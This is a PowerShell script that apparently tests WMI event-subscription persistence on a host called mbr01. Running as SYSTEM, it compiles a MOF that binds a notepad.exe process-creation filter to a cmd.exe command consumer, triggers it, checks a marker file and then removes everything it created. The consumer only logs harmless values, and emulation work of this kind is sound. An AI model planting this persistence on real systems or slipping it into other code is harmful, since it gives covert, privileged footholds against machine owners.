# 3.5J corrected payload (MOF compile via mofcomp — battle-tested) — runs as SYSTEM on mbr01
$ErrorActionPreference = 'Continue'

# Thorough cleanup via CIM
Get-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -ErrorAction SilentlyContinue |
    Where-Object { $_.Filter -match 'CADRE35J' } | Remove-CimInstance -ErrorAction SilentlyContinue
Get-CimInstance -Namespace root/subscription -ClassName __EventFilter -ErrorAction SilentlyContinue |
    Where-Object { $_.Name -eq 'CADRE35JFilter' } | Remove-CimInstance -ErrorAction SilentlyContinue
Get-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -ErrorAction SilentlyContinue |
    Where-Object { $_.Name -eq 'CADRE35JConsumer' } | Remove-CimInstance -ErrorAction SilentlyContinue
Start-Sleep -Seconds 2

# Build MOF
$mof = @'
#pragma namespace("\\\\.\\root\\subscription")

instance of __EventFilter as $Filter
{
  EventNamespace = "root/cimv2";
  Name = "CADRE35JFilter";
  Query = "SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA \"Win32_Process\" AND TargetInstance.Name = \"notepad.exe\"";
  QueryLanguage = "WQL";
};

instance of CommandLineEventConsumer as $Consumer
{
  Name = "CADRE35JConsumer";
  ExecutablePath = "C:\\Windows\\System32\\cmd.exe";
  CommandLineTemplate = "cmd.exe /c echo %COMPUTERNAME% %TIME% %USERNAME% >> C:\\Windows\\Temp\\cadre-wmi-events.txt";
};

instance of __FilterToConsumerBinding
{
  Filter = $Filter;
  Consumer = $Consumer;
};
'@

$mofPath = 'C:\Windows\Temp\cadre-tools\cadre35j.mof'
Set-Content -Path $mofPath -Value $mof -Encoding ASCII
Write-Output 'MOF_WRITTEN'

# Compile as SYSTEM
& 'C:\Windows\System32\wbem\mofcomp.exe' $mofPath 2>&1 | ForEach-Object { Write-Output "MOFCOMP|$_" }
Start-Sleep -Seconds 2

# Confirm all three objects exist
$f = Get-CimInstance -Namespace root/subscription -ClassName __EventFilter -ErrorAction SilentlyContinue | Where-Object { $_.Name -eq 'CADRE35JFilter' }
$c = Get-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -ErrorAction SilentlyContinue | Where-Object { $_.Name -eq 'CADRE35JConsumer' }
$b = Get-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -ErrorAction SilentlyContinue | Where-Object { $_.Filter -match 'CADRE35J' }
Write-Output "OBJ_FILTER $($null -ne $f) OBJ_CONSUMER $($null -ne $c) OBJ_BINDING $($b.Count)"

# Trigger + verify
Remove-Item 'C:\Windows\Temp\cadre-wmi-events.txt' -ErrorAction SilentlyContinue
Start-Process -FilePath 'C:\Windows\System32\notepad.exe' -ErrorAction SilentlyContinue
Start-Sleep -Seconds 12
Get-Process -Name notepad -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
$markerHit = Test-Path 'C:\Windows\Temp\cadre-wmi-events.txt'
Write-Output "WMI_MARKER_HIT $markerHit"
if ($markerHit) { Get-Content 'C:\Windows\Temp\cadre-wmi-events.txt' -Tail 3 | ForEach-Object { Write-Output "WMI_EVENT_LOG|$_" } }

# Cleanup
Get-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -ErrorAction SilentlyContinue |
    Where-Object { $_.Filter -match 'CADRE35J' } | Remove-CimInstance -ErrorAction SilentlyContinue
Get-CimInstance -Namespace root/subscription -ClassName __EventFilter -ErrorAction SilentlyContinue |
    Where-Object { $_.Name -eq 'CADRE35JFilter' } | Remove-CimInstance -ErrorAction SilentlyContinue
Get-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -ErrorAction SilentlyContinue |
    Where-Object { $_.Name -eq 'CADRE35JConsumer' } | Remove-CimInstance -ErrorAction SilentlyContinue
Remove-Item $mofPath -ErrorAction SilentlyContinue
Write-Output 'WMI_CLEANUP_DONE'

$left = Get-CimInstance -Namespace root/subscription -ClassName __EventFilter -ErrorAction SilentlyContinue | Where-Object { $_.Name -eq 'CADRE35JFilter' }
Write-Output "WMI_FILTER_LEFT $($null -ne $left)"
